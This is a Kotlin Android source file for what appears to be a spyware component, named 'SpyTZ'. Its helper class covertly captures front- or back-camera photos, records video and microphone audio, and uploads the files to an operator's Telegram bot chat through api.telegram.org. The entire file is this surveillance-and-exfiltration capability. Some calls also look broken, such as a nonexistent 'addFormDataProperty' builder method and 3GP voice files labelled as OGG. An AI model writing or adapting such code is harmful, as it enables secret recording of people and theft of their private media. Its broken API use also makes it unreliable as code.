package com.spy.tz

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.content.ContextCompat
import okhttp3.*
import java.io.File
import java.io.IOException as JavaIOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class TelegramBotHelper(private val context: Context) {

    companion object {
        private const val TAG = "SpyTZ_Bot"
        private const val BASE_URL = "https://api.telegram.org"
    }

    // State Variables
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null
    
    // CameraX vars
    private var imageCapture: ImageCapture? = null
    private var cameraSelector: CameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA

    // --- CAMERA FUNCTIONS ---

    /**
     * Switches between front and back camera
     */
    fun switchCamera(isBack: Boolean) {
        cameraSelector = if (isBack) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
    }

    /**
     * Captures a photo using the currently selected camera
     * @param botToken Your bot token
     * @param chatId Chat ID to send to
     * @param onResult Callback to know if it succeeded
     */
    fun takePhoto(botToken: String, chatId: String, onResult: (Boolean) -> Unit) {
        if (imageCapture == null) {
            Log.e(TAG, "Camera not initialized")
            onResult(false)
            return
        }

        val photoFile = File(context.getExternalFilesDir(null), "photo_${System.currentTimeMillis()}.jpg")
        
        val builder = ImageCapture.OutputFileOptions.Builder(photoFile)
        
        imageCapture?.takePicture(
            builder.build(), 
            ContextCompat.getMainExecutor(context),
            object : ImageCapture.OnImageSavedCallback {
                override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                    sendPhotoToBot(botToken, chatId, photoFile.absolutePath)
                    onResult(true)
                }

                override fun onError(exception: ImageCaptureException) {
                    Log.e(TAG, "Photo capture failed: ${exception.message}", exception)
                    onResult(false)
                }
            }
        )
    }

    /**
     * Initializes the Camera for capturing
     */
    fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            
            imageCapture = ImageCapture.Builder().build()
            
            try {
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    imageCapture
                )
            } catch (e: Exception) {
                Log.e(TAG, "Use case binding failed", e)
            }
        }, ContextCompat.getMainExecutor(context))
    }

    // --- RECORDING FUNCTIONS ---

    /**
     * Starts Video Recording
     */
    fun startRecording() {
        mediaRecorder = MediaRecorder()
        mediaRecorder?.setVideoSource(MediaRecorder.VideoSource.CAMERA)
        mediaRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
        mediaRecorder?.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        mediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        outputFile = File(context.getExternalFilesDir(null), "video_$timeStamp.mp4")
        
        try {
            mediaRecorder?.setOutputFile(outputFile?.absolutePath)
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            Log.d(TAG, "Video recording started")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting video recording", e)
        }
    }

    /**
     * Stops current recording and returns the file
     */
    fun stopRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            Log.d(TAG, "Recording stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping recording", e)
        }
        return outputFile
    }

    // --- VOICE RECORDING FUNCTIONS ---

    fun startVoiceRecording() {
        mediaRecorder = MediaRecorder()
        mediaRecorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
        mediaRecorder?.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
        mediaRecorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
        
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        outputFile = File(context.getExternalFilesDir(null), "voice_$timeStamp.3gp")
        
        try {
            mediaRecorder?.setOutputFile(outputFile?.absolutePath)
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            Log.d(TAG, "Voice recording started")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting voice recording", e)
        }
    }

    fun stopVoiceRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            Log.d(TAG, "Voice recording stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping voice recording", e)
        }
        return outputFile
    }

    // --- UPLOAD FUNCTIONS ---

    fun sendPhotoToBot(botToken: String, chatId: String, filePath: String, caption: String = "") {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataProperty("caption", caption)
            .addFormDataPart("photo", file.name, 
                RequestBody.create(MediaType.parse("image/jpeg"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendPhoto")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: Call, e: JavaIOException) {
                Log.e(TAG, "Photo upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Photo upload response: ${response.code}")
                response.close()
            }
        })
    }

    fun sendVideoToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataPart("video", file.name, 
                RequestBody.create(MediaType.parse("video/mp4"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVideo")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: Call, e: JavaIOException) {
                Log.e(TAG, "Video upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Video upload response: ${response.code}")
                response.close()
            }
        })
    }
    
    fun sendVoiceToBot(botToken: String, chatId: String, filePath: String) {
        val file = File(filePath)
        if (!file.exists()) return

        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataProperty("chat_id", chatId)
            .addFormDataPart("voice", file.name, 
                RequestBody.create(MediaType.parse("audio/ogg"), file))
            .build()

        val request = Request.Builder()
            .url("$BASE_URL/bot$botToken/sendVoice")
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: Call, e: JavaIOException) {
                Log.e(TAG, "Voice upload failed", e)
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d(TAG, "Voice upload response: ${response.code}")
                response.close()
            }
        })
    }
}
